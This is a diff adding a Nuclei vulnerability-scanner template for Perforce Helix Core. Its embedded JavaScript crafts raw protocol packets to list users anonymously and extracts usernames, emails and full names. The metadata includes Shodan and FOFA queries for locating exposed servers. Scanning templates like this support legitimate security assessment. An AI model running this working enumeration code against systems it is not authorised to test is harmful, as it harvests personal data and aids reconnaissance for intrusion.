@@ -1,0 +1,135 @@
+flow: tcp(1) && javascript(1)
+id: perforce-user-enumeration
+info:
+  author: Morgan Robertson
+  classification:
+    cpe: cpe:2.3:a:perforce:helix_core:*:*:*:*:*:*:*:*
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    cvss-score: 5.3
+    cwe-id: CWE-200
+  description: 'Detected Perforce server allowed anonymous user listing due to run.users.authorize
+    being set to 0 (the default). The server returned a full list of users including
+    usernames, email addresses, and full names without authentication. Both ASCII
+    and Unicode server modes were affected. SSL-enforcing servers are not affected.
+
+    '
+  metadata:
+    fofa-query: port="1666" && protocol="unknown"
+    max-request: 3
+    product: helix_core
+    shodan-query: port:1666 "P4D"
+    vendor: perforce
+    verified: true
+  name: Perforce Server - User Enumeration
+  reference:
+  - https://morganrobertson.net/p4wned/
+  - https://www.keysight.com/blogs/en/tech/nwvs/2022/06/08/a-sneak-peek-into-the-protocol-behind-perforce
+  - https://help.perforce.com/helix-core/release-notes/current/relnotes.txt
+  severity: medium
+  tags: enum,helixcore,perforce,scm,unauth,user-listing
+javascript:
+- args:
+    Host: '{{Host}}'
+    Port: '1666'
+  code: "var net = require(\"nuclei/net\");\n\nfunction strToHex(str) {\n    var hex\
+    \ = \"\";\n    for (var i = 0; i < str.length; i++) {\n        var h = str.charCodeAt(i).toString(16);\n\
+    \        if (h.length < 2) h = \"0\" + h;\n        hex += h;\n    }\n    return\
+    \ hex;\n}\n\nfunction numToHexLE(num) {\n    var b1 = (num & 0xFF), b2 = ((num\
+    \ >> 8) & 0xFF), b3 = ((num >> 16) & 0xFF), b4 = ((num >> 24) & 0xFF);\n    return\
+    \ [b1, b2, b3, b4].map(function(s){\n       var x = s.toString(16);\n       return\
+    \ (x.length<2 ? \"0\"+x : x);\n    }).join(\"\");\n}\n\nfunction packParamHex(name,\
+    \ value) {\n    return strToHex(name) + \"00\" + numToHexLE(value.length) + strToHex(value)\
+    \ + \"00\";\n}\n\nfunction buildPacketHex(params) {\n    var payloadHex = \"\"\
+    ;\n    for (var i = 0; i < params.length; i++) {\n        payloadHex += packParamHex(params[i][0],\
+    \ params[i][1]);\n    }\n    var totalLen = payloadHex.length / 2;\n    var lenLow\
+    \ = totalLen & 0xFF;\n    var lenHigh = (totalLen >> 8) & 0xFF;\n    var xor =\
+    \ lenLow ^ lenHigh;\n    var headerHex = [xor, lenLow, lenHigh, 0, 0].map(function(s){\n\
+    \       var x = s.toString(16);\n       return (x.length<2 ? \"0\"+x : x);\n \
+    \   }).join(\"\");\n    return headerHex + payloadHex;\n}\n\nfunction parsePerforceResponse(dataStr)\
+    \ {\n    var offset = 0;\n    var results = [];\n    while (offset < dataStr.length)\
+    \ {\n        if (offset + 5 > dataStr.length) break;\n        var lenLow = dataStr.charCodeAt(offset\
+    \ + 1);\n        var lenHigh = dataStr.charCodeAt(offset + 2);\n        var bodyLen\
+    \ = lenLow | (lenHigh << 8);\n        var totalPacketSize = 5 + bodyLen;\n   \
+    \     if (offset + totalPacketSize > dataStr.length) break;\n\n        var body\
+    \ = dataStr.substring(offset + 5, offset + totalPacketSize);\n        var packetObj\
+    \ = {};\n        var bodyOffset = 0;\n\n        while (bodyOffset < body.length)\
+    \ {\n            var nameEnd = body.indexOf('\\u0000', bodyOffset);\n        \
+    \    if (nameEnd === -1) break;\n            var key = body.substring(bodyOffset,\
+    \ nameEnd);\n            bodyOffset = nameEnd + 1;\n\n            if (bodyOffset\
+    \ + 4 > body.length) break;\n            var v0 = body.charCodeAt(bodyOffset);\n\
+    \            var v1 = body.charCodeAt(bodyOffset+1);\n            var v2 = body.charCodeAt(bodyOffset+2);\n\
+    \            var v3 = body.charCodeAt(bodyOffset+3);\n            var valLen =\
+    \ (v0 | (v1 << 8) | (v2 << 16) | (v3 << 24)) >>> 0;\n            bodyOffset +=\
+    \ 4;\n\n            if (bodyOffset + valLen > body.length) break;\n          \
+    \  var value = body.substring(bodyOffset, bodyOffset + valLen);\n            packetObj[key]\
+    \ = value;\n            bodyOffset += valLen + 1;\n        }\n        results.push(packetObj);\n\
+    \        offset += totalPacketSize;\n    }\n    return results;\n}\n\nfunction\
+    \ enumUsers(host, port, useUnicode) {\n    var address = host + \":\" + port;\n\
+    \n    var p1 = [\n        [\"cmpfile\", \"\"], [\"altSync\", \"\"], [\"client\"\
+    , \"76\"], [\"api\", \"99999\"],\n        [\"enableStreams\", \"\"], [\"enableGraph\"\
+    , \"\"], [\"expandAndmaps\", \"\"], [\"chunking\", \"\"],\n        [\"host\",\
+    \ \"localhost\"], [\"port\", address], [\"sndbuf\", \"1969919\"], [\"rcvbuf\"\
+    , \"98304\"],\n        [\"autoTune\", \"1\"], [\"func\", \"protocol\"]\n    ];\n\
+    \n    var p2 = [\n        [\"version\", \"2024.2/LINUX26X86_64/2697822\"], [\"\
+    autoLogin\", \"\"], [\"prog\", \"p4\"],\n        [\"client\", \"localhost\"],\
+    \ [\"cwd\", \"/tmp\"], [\"host\", \"localhost\"],\n        [\"os\", \"UNIX\"],\
+    \ [\"locale\", \"C\"], [\"user\", \"temp\"]\n    ];\n\n    if (useUnicode) {\n\
+    \        p2.push([\"unicode\", \"\"]);\n    }\n\n    p2.push([\"charset\", \"\
+    1\"]);\n    p2.push([\"utf8bom\", \"1\"]);\n    p2.push([\"clientCase\", \"0\"\
+    ]);\n    p2.push([\"func\", \"user-users\"]);\n\n    var p3 = [ [\"func\", \"\
+    release\"] ];\n\n    var payloadHex = buildPacketHex(p1) + buildPacketHex(p2);\n\
+    \    var releaseHex = buildPacketHex(p3);\n    var rawBuffer = \"\";\n\n    try\
+    \ {\n        var conn = net.Open(\"tcp\", address);\n        conn.SendHex(payloadHex);\n\
+    \        conn.SetTimeout(3);\n\n        for(var loop=0; loop<10; loop++) {\n \
+    \           try {\n                var bytes = conn.Recv(4096);\n            \
+    \    if (bytes && bytes.length > 0) {\n                    for(var i=0; i < bytes.length;\
+    \ i++) {\n                         rawBuffer += String.fromCharCode(bytes[i]);\n\
+    \                    }\n                    if (rawBuffer.indexOf('func\\u0000\\\
+    u0007\\u0000\\u0000\\u0000release\\u0000') !== -1) {\n                       \
+    \ break;\n                    }\n                } else {\n                  \
+    \  break;\n                }\n            } catch(e) { break; }\n        }\n \
+    \       try { conn.SendHex(releaseHex); } catch(e) {}\n        conn.Close();\n\
+    \    } catch(e) { return []; }\n\n    var packets = parsePerforceResponse(rawBuffer);\n\
+    \    var extractedUsers = [];\n\n    for(var i=0; i < packets.length; i++) {\n\
+    \        var pkt = packets[i];\n        if (pkt['user'] && pkt['email'] && pkt['func']\
+    \ === 'client-Message') {\n            extractedUsers.push({\n               \
+    \ \"user\": pkt['user'],\n                \"email\": pkt['email'],\n         \
+    \       \"fullName\": pkt['fullName'],\n                \"accessDate\": pkt['accessDate']\n\
+    \            });\n        }\n    }\n    return extractedUsers;\n}\n\nvar users\
+    \ = enumUsers(Host, Port, false);\n\nif (users.length === 0) {\n    users = enumUsers(Host,\
+    \ Port, true);\n}\n\nJSON.stringify(users);\n"
+  extractors:
+  - json:
+    - .[].user
+    name: users
+    type: json
+  - json:
+    - .[].email
+    name: emails
+    type: json
+  - json:
+    - .[].fullName
+    name: full_names
+    type: json
+  matchers:
+  - condition: and
+    type: word
+    words:
+    - '"user":'
+    - '"email":'
+tcp:
+- host:
+  - '{{Host}}:1666'
+  inputs:
+  - data: efef000000636d7066696c65000000000000616c7453796e63000000000000636c69656e7400020000003937006170690005000000393939393900656e61626c6553747265616d73000000000000656e61626c654772617068000000000000657870616e64416e646d6170730000000000006368756e6b696e67000000000000686f737400090000006c6f63616c686f737400706f727400120000003139322e3136382e302e3130313a3136363600736e646275660007000000313936393931390072637662756600050000003938333034006175746f54756e650001000000310066756e63000800000070726f746f636f6c00eded00000076657273696f6e001c000000323032342e322f4c494e555832365838365f36342f32363937383232006175746f4c6f67696e00000000000070726f670002000000703400636c69656e7400090000006c6f63616c686f73740063776400040000002f746d7000686f737400090000006c6f63616c686f7374006f730004000000554e4958006c6f63616c65000100000043007573657200040000007573657200756e69636f6465000000000000636861727365740001000000310075746638626f6d00010000003100636c69656e74436173650001000000300066756e630009000000757365722d696e666f00
+    type: hex
+  matchers:
+  - condition: and
+    encoding: hex
+    internal: true
+    part: data
+    type: word
+    words:
+    - xfiles
+    - server
+  read-size: 4096
